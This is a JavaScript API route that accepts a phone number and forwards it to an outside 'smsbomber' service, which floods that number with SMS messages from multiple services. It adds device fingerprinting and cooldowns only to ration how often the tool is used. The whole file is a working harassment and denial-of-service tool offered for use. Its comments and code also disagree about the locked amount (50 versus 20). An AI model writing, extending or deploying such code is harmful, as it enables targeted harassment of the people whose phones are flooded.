import crypto from "crypto";

// 15-minute cooldown (per device & per phone number)
const cooldowns = new Map();         // device → timestamp
const numberCooldowns = new Map();   // phoneNumber → timestamp
const COOLDOWN_MS = 15 * 60 * 1000;  // 15 minutes

function makeHybridIdHash(userAgent, deviceModel, cookieId) {
  const raw = `${userAgent}||${deviceModel}||${cookieId}`;
  return crypto.createHash("sha256").update(raw).digest("hex");
}

// Helper: Parse cookies
function parseCookies(cookieHeader = "") {
  if (!cookieHeader) return {};
  return Object.fromEntries(
    cookieHeader.split(";").map(c => {
      const [k, ...v] = c.trim().split("=");
      return [k, decodeURIComponent(v.join("="))];
    })
  );
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  const { phoneNumber, amount } = req.body;

  if (!phoneNumber || !amount) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  // Lock amount to 50
  if (Number(amount) !== 20) {
    return res.status(400).json({ error: "Amount is locked to 50 only." });
  }

  // Parse existing cookie or create one
  const cookies = parseCookies(req.headers.cookie);
  let cookieId = cookies.device_id;

  if (!cookieId) {
    cookieId = crypto.randomUUID();
    res.setHeader(
      "Set-Cookie",
      `device_id=${cookieId}; Path=/; Max-Age=31536000; HttpOnly; SameSite=Lax`
    );
  }

  const userAgent = (req.headers["user-agent"] || "unknown-ua").trim();
  const deviceModel =
    (req.headers["x-device-model"] ||
      req.headers["sec-ch-ua-platform"] ||
      (() => {
        const m = userAgent.match(/\(([^)]+)\)/);
        return m ? m[1].split(";").map(s => s.trim())[0] : "unknown-model";
      })()
    ).toString();

  // Generate device hash (uses cookie ID)
  const deviceId = makeHybridIdHash(userAgent, deviceModel, cookieId);
  const now = Date.now();

  // === ⏳ Check Device Cooldown ===
  const lastDeviceUse = cooldowns.get(deviceId);
  if (lastDeviceUse && now - lastDeviceUse < COOLDOWN_MS) {
    const remaining = Math.ceil((COOLDOWN_MS - (now - lastDeviceUse)) / 1000);
    const mins = Math.floor(remaining / 60);
    const secs = remaining % 60;
    const readable =
      mins > 0
        ? `${mins} minute${mins > 1 ? "s" : ""} and ${secs} second${secs !== 1 ? "s" : ""}`
        : `${secs} second${secs !== 1 ? "s" : ""}`;
    return res.status(429).json({
      error: `Device cooldown active. Please wait ${readable} before sending again.`,
      remainingSeconds: remaining
    });
  }

  // === 📱 Check Phone Number Cooldown ===
  const lastNumberUse = numberCooldowns.get(phoneNumber);
  if (lastNumberUse && now - lastNumberUse < COOLDOWN_MS) {
    const remaining = Math.ceil((COOLDOWN_MS - (now - lastNumberUse)) / 1000);
    const mins = Math.floor(remaining / 60);
    const secs = remaining % 60;
    const readable =
      mins > 0
        ? `${mins} minute${mins > 1 ? "s" : ""} and ${secs} second${secs !== 1 ? "s" : ""}`
        : `${secs} second${secs !== 1 ? "s" : ""}`;
    return res.status(429).json({
      error: `This phone number is on cooldown. Please wait ${readable} before sending again.`,
      remainingSeconds: remaining
    });
  }

  try {
    // Compose new GET endpoint using provided phone and locked amount
    const phoneParam = encodeURIComponent(String(phoneNumber));
    const amountParam = encodeURIComponent(String(amount));
    const downstreamUrl = `https://haji-mix-api.gleeze.com/api/smsbomber?phone=${phoneParam}&amount=${amountParam}`;

    const smsResponse = await fetch(downstreamUrl, {
      method: "GET",
      headers: {
        "Accept": "application/json"
      }
    });

    const downstream = await smsResponse.json().catch(() => ({}));

    if (smsResponse.ok) {
      // ✅ Set cooldowns for both device and phone number
      cooldowns.set(deviceId, Date.now());
      numberCooldowns.set(phoneNumber, Date.now());

      // Return normalized response
      if (typeof downstream.status === "boolean" && downstream.details) {
        const enriched = {
          ...downstream,
          details: {
            ...downstream.details,
            requestedPhone: String(phoneNumber),
            requestedAmount: Number(amount),
            timestamp: new Date().toISOString()
          }
        };
        return res.status(200).json(enriched);
      }

      const services = (downstream.services || downstream.details?.services) || {};
      const total_success =
        Number(downstream.total_success ?? downstream.successCount ?? 0);
      const total_failed =
        Number(downstream.total_failed ?? downstream.failCount ?? 0);

      return res.status(200).json({
        status: true,
        message: downstream.message ?? "SMS bombing completed using multiple services.",
        details: {
          total_success,
          total_failed,
          services,
          requestedPhone: String(phoneNumber),
          requestedAmount: Number(amount),
          timestamp: new Date().toISOString()
        }
      });
    } else {
      return res.status(smsResponse.status).json(downstream);
    }
  } catch (error) {
    return res.status(500).json({ error: error.message || "Internal Server Error" });
  }
}
